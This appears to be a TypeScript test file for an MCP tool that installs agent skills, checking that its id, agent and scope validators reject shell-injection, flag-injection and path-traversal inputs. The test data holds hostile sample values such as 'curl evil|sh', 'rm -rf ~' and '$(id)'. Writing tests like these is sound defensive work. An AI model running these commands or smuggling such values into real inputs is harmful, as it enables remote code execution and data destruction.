import assert from "node:assert/strict";
import { test } from "node:test";

import {
  assertValidAgent,
  assertValidScope,
  parseAndValidateSkillId,
} from "../src/tools/validate.js";
import { registerInstallSkill } from "../src/tools/install.js";

/** Minimal fake McpServer that captures the registered tool + lets us invoke it. */
function captureInstallTool() {
  let handler:
    | ((args: { id: string; agents?: string[]; scope?: "project" | "global" }) => Promise<{
        isError?: boolean;
        structuredContent?: Record<string, unknown>;
      }>)
    | undefined;
  const fakeServer = {
    registerTool(_name: string, _def: unknown, h: typeof handler) {
      handler = h;
    },
  };
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  registerInstallSkill(fakeServer as any);
  if (!handler) throw new Error("install_skill did not register a handler");
  return handler;
}

const INJECTION_IDS = [
  "devfellowship/skills; curl evil|sh",
  "devfellowship/`whoami`",
  "devfellowship/$(id)",
  "devfellowship/skills && rm -rf ~",
  "-rf/skills",
  "devfellowship/skills/-x",
  "devfellowship/sk ills",
  "devfellowship/skills|cat",
];

test("parseAndValidateSkillId accepts a clean owner/repo/slug", () => {
  const parsed = parseAndValidateSkillId("devfellowship/skills/dfl-stack");
  assert.deepEqual(parsed, { owner: "devfellowship", repo: "skills", slug: "dfl-stack" });
});

test("parseAndValidateSkillId accepts owner/repo", () => {
  const parsed = parseAndValidateSkillId("devfellowship/skills");
  assert.deepEqual(parsed, { owner: "devfellowship", repo: "skills" });
});

test("parseAndValidateSkillId rejects injection payloads", () => {
  for (const id of INJECTION_IDS) {
    assert.throws(() => parseAndValidateSkillId(id), undefined, `should reject: ${id}`);
  }
});

test("assertValidAgent rejects metachars, accepts clean names", () => {
  assert.doesNotThrow(() => assertValidAgent("claude"));
  assert.doesNotThrow(() => assertValidAgent("cursor-2"));
  assert.throws(() => assertValidAgent("claude; rm -rf ~"));
  assert.throws(() => assertValidAgent("$(id)"));
  assert.throws(() => assertValidAgent("Claude"));
});

test("assertValidAgent rejects a leading-dash flag-injection value", () => {
  assert.throws(() => assertValidAgent("-rf"), /must not start with "-"/);
  assert.throws(() => assertValidAgent("-g"), /must not start with "-"/);
});

test("assertValidAgent rejects an over-length value", () => {
  assert.throws(() => assertValidAgent("a".repeat(101)), /exceeds 100/);
});

test("parseAndValidateSkillId rejects a `..` traversal segment", () => {
  assert.throws(() => parseAndValidateSkillId("devfellowship/repo/.."), /not allowed/);
  assert.throws(() => parseAndValidateSkillId("devfellowship/.."), /not allowed/);
  assert.throws(() => parseAndValidateSkillId("devfellowship/repo/."), /not allowed/);
});

test("parseAndValidateSkillId rejects leading/trailing-dot segments", () => {
  assert.throws(() => parseAndValidateSkillId("devfellowship/repo/.hidden"), /start or end with/);
  assert.throws(() => parseAndValidateSkillId("devfellowship/repo/trailing."), /start or end with/);
});

test("parseAndValidateSkillId rejects an over-length segment", () => {
  assert.throws(
    () => parseAndValidateSkillId(`devfellowship/skills/${"a".repeat(101)}`),
    /exceeds 100/,
  );
});

test("assertValidScope enforces the allowlist", () => {
  assert.doesNotThrow(() => assertValidScope("project"));
  assert.doesNotThrow(() => assertValidScope("global"));
  assert.throws(() => assertValidScope("system"));
  assert.throws(() => assertValidScope("global; echo x"));
});

test("install_skill tool REJECTS injection ids", async () => {
  const install = captureInstallTool();
  for (const id of INJECTION_IDS) {
    const res = await install({ id });
    assert.equal(res.isError, true, `expected error for id: ${id}`);
  }
});

test("install_skill tool REJECTS injected agents", async () => {
  const install = captureInstallTool();
  const res = await install({ id: "devfellowship/skills", agents: ["claude; curl evil|sh"] });
  assert.equal(res.isError, true);
});

test("install_skill tool accepts a valid id + agents and builds a safe command", async () => {
  const install = captureInstallTool();
  const res = await install({
    id: "devfellowship/skills/dfl-stack",
    agents: ["claude", "cursor"],
    scope: "global",
  });
  assert.notEqual(res.isError, true);
  assert.equal(
    res.structuredContent?.["command"],
    "npx skills add devfellowship/skills@dfl-stack -g --agent claude --agent cursor",
  );
});

test("install_skill command carries the specific skill via owner/repo@skill", async () => {
  const install = captureInstallTool();
  const res = await install({ id: "devfellowship/skills/dfl-code-style", scope: "project" });
  assert.notEqual(res.isError, true);
  assert.equal(
    res.structuredContent?.["command"],
    "npx skills add devfellowship/skills@dfl-code-style",
  );
});

test("install_skill falls back to the whole repo when no skill segment is given", async () => {
  const install = captureInstallTool();
  const res = await install({ id: "devfellowship/skills", scope: "project" });
  assert.notEqual(res.isError, true);
  assert.equal(res.structuredContent?.["command"], "npx skills add devfellowship/skills");
});
